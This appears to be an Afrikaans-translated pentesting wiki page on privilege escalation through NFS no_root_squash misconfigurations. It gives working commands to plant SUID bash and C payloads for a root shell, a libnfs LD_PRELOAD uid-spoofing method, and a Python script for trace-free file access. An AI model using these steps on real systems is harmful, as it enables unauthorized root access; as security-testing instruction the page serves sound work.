# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Basiese Squashing-inligting

NFS sal gewoonlik (veral in Linux) die aangeduide `uid` en `gid` deur die client vertrou wanneer dit koppel om toegang tot die lêers te verkry (indien kerberos nie gebruik word nie). Daar is egter sekere konfigurasies wat op die server gestel kan word om **hierdie gedrag te verander**:

- **`all_squash`**: Dit squash alle toegange en karteer elke gebruiker en groep na **`nobody`** (65534 unsigned / -2 signed). Daarom is almal `nobody` en word geen gebruikers gebruik nie.
- **`root_squash`/`no_all_squash`**: Dit is die verstek op Linux en **squash slegs toegang met uid 0 (root)**. Daarom word enige `UID` en `GID` vertrou, maar `0` word na `nobody` gesquash (dus is geen root-impersonation moontlik nie).
- **``no_root_squash`**: As hierdie konfigurasie geaktiveer is, squash dit nie eens die root-gebruiker nie. Dit beteken dat as jy ’n directory met hierdie konfigurasie mount, jy as root toegang daartoe kan verkry.

In die **/etc/exports**-lêer, as jy ’n directory vind wat as **no_root_squash** gekonfigureer is, kan jy dit **as ’n client** toegang verkry en **daarin skryf** asof jy die plaaslike **root** van die masjien is.

Vir meer inligting oor **NFS**, kyk na:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 met bash:
- **Mount daardie directory** op ’n client-masjien, en **kopieer as root** die **/bin/bash**-binary binne die gemounte folder en gee dit **SUID**-regte, en **voer daardie bash-binary vanaf die victim**-masjien uit.
- Let daarop dat **`no_root_squash`** op die server gekonfigureer moet wees om root binne die NFS-share te wees.
- Indien dit egter nie geaktiveer is nie, kan jy na ’n ander gebruiker eskaleer deur die binary na die NFS-share te kopieer en dit die SUID-permissie te gee as die gebruiker na wie jy wil eskaleer.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opsie 2 met C-compiled code:
- **Mounting that directory** op ’n kliëntmasjien, en **as root copying** binne die gemounte vouer ons compiled payload wat die SUID-permission sal abuse, dit **SUID**-regte sal gee, en daardie binary vanaf die **victim**-masjien sal **execute** (jy kan hier ’n paar [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) vind).
- Dieselfde beperkings as voorheen
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Plaaslike Exploit

> [!TIP]
> Let daarop dat indien jy **'n tonnel vanaf jou masjien na die slagoffermasjien kan skep, jy steeds die Remote-weergawe kan gebruik om hierdie privilege escalation te exploit deur die vereiste poorte te tonnel**.\
> Die volgende truuk is van toepassing indien die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy nie** die **remote exploit** kan gebruik nie en sal jy hierdie **truuk moet abuse**.\
> Nog 'n vereiste vir die exploit om te werk, is dat die export binne `/etc/export` **die `insecure`-vlag moet gebruik**.\
> --_Ek is nie seker of hierdie truuk sal werk indien `/etc/export` 'n IP-adres aandui nie_--

### Basiese Inligting

Die scenario behels die exploitation van 'n gemounte NFS-share op 'n plaaslike masjien, deur 'n fout in die NFSv3-spesifikasie te benut wat die client toelaat om sy uid/gid te spesifiseer, wat ongemagtigde toegang moontlik kan maak. Die exploitation behels die gebruik van [libnfs](https://github.com/sahlberg/libnfs), 'n library wat die vervalsing van NFS RPC-calls moontlik maak.

#### Kompilering van die Library

Die library se kompileringstappe mag aanpassings vereis, afhangend van die kernel-weergawe. In hierdie spesifieke geval is die fallocate syscalls uitgekommenteer. Die kompilasieproses behels die volgende commands:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Die uitvoer van die Exploit

Die exploit behels die skep van ’n eenvoudige C-program (`pwn.c`) wat privileges na root verhoog en dan ’n shell uitvoer. Die program word gekompileer, en die gevolglike binary (`a.out`) word op die share geplaas met suid root, deur `ld_nfs.so` te gebruik om die uid in die RPC calls te vervals:

1. **Kompileer die exploit-kode:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Plaas die exploit op die share en wysig sy toestemmings deur die uid te vervals:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Voer die exploit uit om root privileges te verkry:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell vir Stealthy File Access

Sodra root access verkry is, word ’n Python-script (nfsh.py) gebruik om met die NFS share te kommunikeer sonder om ownership te verander (om te voorkom dat dit traces laat). Hierdie script pas die uid aan sodat dit ooreenstem met dié van die file waartoe toegang verkry word, wat interaksie met files op die share sonder permission issues moontlik maak:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Voer uit soos:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
